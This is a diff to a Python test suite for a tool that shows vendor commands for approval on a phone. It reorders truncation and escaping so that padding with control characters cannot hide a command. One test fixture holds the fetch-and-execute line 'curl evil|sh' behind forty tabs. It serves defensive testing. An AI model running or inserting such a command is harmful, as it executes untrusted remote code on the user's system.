@@ -215,11 +215,14 @@ def test_a_hung_update_is_a_failure_and_the_next_still_runs() -> None:
 
 
 def test_a_failure_detail_is_bounded() -> None:
-    """The vendor's stderr reaches a phone screen; a megabyte must not."""
+    """The vendor's stderr reaches a phone screen; a megabyte must not. The
+    240 limit now bounds the vendor's own text (#305), so the escaped,
+    marked result is a fixed, small amount longer, never unbounded."""
     agent = FakeAgent([row("a@m")], **{"a@m": done(2, stderr="x" * 10_000)})
     (outcome,) = run(agent)
     assert outcome.detail is not None
-    assert len(outcome.detail) <= 240
+    assert len(outcome.detail) < 300
+    assert outcome.detail.endswith("(truncated)")
 
 
 # -- the operation fails ---------------------------------------------------------
@@ -468,12 +471,26 @@ def test_a_failure_detail_cannot_rewrite_its_line() -> None:
     assert not any(ch in outcome.detail for ch in "\r\x1b")
 
 
-def test_the_escaping_happens_before_the_cut() -> None:
-    """Escaping after truncation could leave a raw escape split at the edge;
-    escaping first can only lengthen, and the cut then bounds the result."""
+def test_the_cut_happens_before_the_escaping() -> None:
+    """Escaping before the cut bounds the ESCAPED form, so a marketplace can
+    pad its declared command with controls and push the payload out of the
+    240 character budget six times sooner than an honest command would
+    (#305): forty tabs escape to 240 characters on their own, leaving no
+    room for the command that follows."""
+    line = json.dumps({"shownCommand": {"command": "\t" * 40 + "curl evil|sh", "sha256": "ab"}})
+    agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
+    (outcome,) = run(agent)
+    assert outcome.approved_command is not None
+    assert "curl evil|sh" in outcome.approved_command
+
+
+def test_a_command_over_the_limit_carries_the_cut_marker() -> None:
+    """The cut now bounds the vendor's own text, so escaping a long run of
+    controls can make the rendered line grow past 240; the marker is what
+    says it was shortened at all."""
     line = json.dumps({"shownCommand": {"command": "\x1b" * 500, "sha256": "ab"}})
     agent = FakeAgent([row("a@m")], **{"a@m": done(0, stdout=line)})
     (outcome,) = run(agent)
     assert outcome.approved_command is not None
-    assert len(outcome.approved_command) <= 240
+    assert outcome.approved_command.endswith("(truncated)")
     assert "\x1b" not in outcome.approved_command
